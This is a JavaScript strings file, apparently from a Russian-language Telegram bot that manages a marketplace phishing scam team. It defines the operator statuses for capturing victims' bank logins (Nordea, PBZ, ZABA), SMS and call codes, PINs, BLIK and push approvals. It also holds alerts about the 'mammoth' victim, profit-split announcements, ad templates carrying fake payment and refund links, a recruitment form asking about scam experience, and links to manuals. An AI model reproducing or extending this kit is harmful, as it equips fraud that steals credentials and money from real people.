module.exports = {
  statuses: {
    sms: "📥 СМС-КОД",
    lk: "🔐 ЛК",
    lk1: "🔐 ЛК Nordea",
    lk2: "🔐 ЛК Nordea Push",
    lk3: "🔐 Все ЛК",
    lk4: "🔐 ЛК PBZ",
    lk5: "🔐 ЛК ZABA",
    mtoken: "📧 МТокен",
    pincode: "🖍 Пинкод",
    passcode: "🔏 Passcode",
    push: "📱 ПУШ",
    blik: "#️⃣ БЛИК",
    appCode: "📬 КОД С ПРИЛОЖЕНИЯ",
    callCode: "☎️ КОД ИЗ ЗВОНКА",
    callBank: "📶 Звонок в банк",
    picture: "🖼 КАРТИНКА",
    limits: "⚠️ ЛИМИТЫ",
    otherCard: "⚠️ ДРУГАЯ КАРТА",
    custom: "🧾 КАСТОМНОЕ ОКНО",
    correctBalance: "⚠️ ТОЧНЫЙ БАЛАНС",
    forVerify: "⚠️ НУЖЕН БАЛАНС",
    dtrans: "💸 Прямой перевод"
  },
  workerStatuses: {
    push: "📲 Вашему мамонту отправили ПУШ",
    sms: "📤 Вашему мамонту отправили СМС-КОД",
    lk1: "🔐 Вашего мамонта отправили на ЛК Nordea",
    lk2: "🔐 Вашего мамонта отправили на ЛК Nordea Push",
    lk3: "🔐 Вашего мамонта отправили на Все ЛК",
    lk4: "🔐 Вашего мамонта отправили на ЛК PBZ",
    lk5: "🔐 Вашего мамонта отправили на ЛК ZABA",
    lk: "🔐 Вашего мамонта отправили на ЛК",
    mtoken: "📧 Вашему мамонту отправили сообщение с мтокеном",
    pincode: "🖍 Вашему мамонту отправили сообщение с pin",
    callBank: "📶 Вашего мамонта перевели на подтверждение звонка из банка",
    passcode: "🔏 Вашему мамонту отправили сообщение с passcode",
    custom: "🧾 Вашего мамонта перевели на кастомное окно",
    blik: "📩 Вашему мамонту отправили БЛИК",
    callCode: "☎️ Вашему мамонту отправили звонок с кодом",
    appCode: "📬 Вашему мамонту отправили код в приложение",
    picture: "🖼 Вашему мамонту отправили картинку",
    limits: "⚠️ Ваш мамонт должен поднять лимиты",
    otherCard: "⚠️ Ваш мамонт должен ввести другую карту",
    forVerify: "⚠️ У вашего мамонта должен быть баланс на карте",
    correctBalance: "⚠️ Ваш мамонт должен ввести точный баланс",
    dtrans: "💸 Переход на gumtree verification"
  },
  wrongWorkerStatuses: {
    code: "❌ Ваш мамонт ввёл неверный КОД",
    mtoken: "❌ Ваш мамонт ввёл неверный МТОКЕН",
    passcode: "❌ Ваш мамонт ввёл неверный PASSCODE",
    pincode: "❌ Ваш мамонт ввёл неверный PIN",
    lk: "❌ Ваш мамонт ввёл неверные данные от ЛК",
    picture: "❌ Ваш мамонт выбрал неверную КАРТИНКУ",
    push: "❌ Ваш мамонт не подтверждает ПУШ",
  },
  newProfit: {
    channel: `<b>💎 НОВЫЙ ПРОФИТ {serviceTitle}</b>
🤑 <b>Оплачено: {amount}</b>
💰 <b>Доля: {workerAmount}</b>
🦊<b> Вбивер: {writer}</b>`,
    wait: "⏳ В ожидании",
    payed: "✅ Выплачено",
    razvitie: "🌎 На развитие",
    worker: `<b>🤑 У тебя залет #{profitId} = {amount}</b>
💰 Доля: <b>{workerAmount}</b>
🦊 Вбивер: <b>{writer}</b>`,
  },
  myAd: {
    text: `<b>📦 Объявление {service}</b>

💬 Название: <b>{title}</b>
💰 Цена: <b>{price}</b>
📰 Имя: <b>{name}</b>
📱 Телефон: <b>{phone}</b>
🏡 Адрес: <b>{address}</b>
💸 Чекер баланса: <b>{balanceChecker}</b>

🔗 Получение оплаты: <b>{fakeLink}</b>
🔗 Возврат: <b>{refundLink}</b>`,
  },
  now_writers: "✍️ Сейчас на вбиве:",
  chat_list: "💬 Список чатов",
  payouts: "💸 Выплаты",
  workers: "👥 Воркеры",
  top_workers: "🏆 Топ воркеров",
  top_null: "🔍 В топе ещё никого нету",
  mainMenu: {
    text: `
<b>✳️  𝙔𝙊𝙐 𝙏𝙀𝘼𝙈  ✳️</b>
<b></b>
<b>🆔 Твой ID:</b> <code>{id}</code>

<b>╔🖥 Активных объявлений:</b> <b>{ads_count}</b>
<b>╠💎 Статус:</b> <b>{status}</b>
<b>╠💸 Колл-во профитов:</b> <b>{profits_count}</b>
<b>╠💵 Сумма профитов:</b> <b>{profits_sum}</b>
<b>╚🎩 Ник:</b> <b>{hide_nick}</b>
<b></b>
<b>💠 Ты в команде уже {with_us}</b>`,
    buttons: {
      create_link: "🪓 Крафт ссылки",
      my_ads: "🖥 Мои объявления",
      my_profits: "💷 Мои профиты",
      writer: "⁉️ Кто на вбиве",
      workers_top: "👑 Топ работяг",
      chats: "💬 Чаты",
      settings: "⚙️ Настройки",
      send_sms: "📤 Отправить СМС мамонту",
      parse: "🤖 Спарсить объявления",
      my_parsings: "🗃 Мои парсинги",
    },
  },
  choose_country: "🌎 Выберите страну",
  choose_service: "📦 Выберите сервис",
  go_to_menu: "◀️ В меню",
  go_back: "◀️ Назад",
  roles: {
    admin: "Администратор 👑",
    writer: "Вбивер ✍️",
    worker: "Воркер 👷",
    pro: "Профи ☄️",
  },
  requests: {
    need_send_request:
      "<u>Нужно подать заявку. Ты готовы?</u>",
    ready_send_button: "⚡️ Погнали ⚡️",
    wait_request_process: "⏳ Ожидайте рассмотрения вашей заявки",
    done: "<i>🐈 Ожидай братик!</i>",
    accepted: "🎉 Поздравляем, ты принят!",
    declined: "😞 Поздравляю, идёшь нахуй",
    steps: [
      {
        request_text: "Откуда узнал",
        scene_text: `<i>🕵️‍♂️ Приступаем к заполнению заявки!</i>
➖➖➖➖➖➖➖➖➖➖➖
<b>❓ Откуда вы узнали о нашей тиме?</b>`,
      },
      {
        request_text: "Какой опыт",
        scene_text: `🎊 Отлично! Второй вопрос:
➖➖➖➖➖➖➖➖➖➖➖
<b>❓ Имеется ли у вас опыт работы в скаме?</b>`,
      },
      {
        request_text: "Сколько времени готов уделять",
        scene_text: `✌️ И последний вопрос:
➖➖➖➖➖➖➖➖➖➖➖
<b>❓ Сколько времени Вы готовы уделять этой работе?</b>`,
      },
    ],
  },
  your_account_banned: "❌ Ваш аккаунт заблокировали",
  newChatMemberText: `💭 Добро пожаловать в чат проекта, {username}!

🆘 Мануалы

🇪🇺 <a href="https://telegra.ph/Manual-08-04-2">Клик</a>
🇵🇹 <a href="https://t.me/joinchat/T5NNFEbsaLg4MTky">Клик</a>
🇪🇸 <a href="https://t.me/joinchat/sx239GXLO2liNTQ6">Клик</a>
`,
};
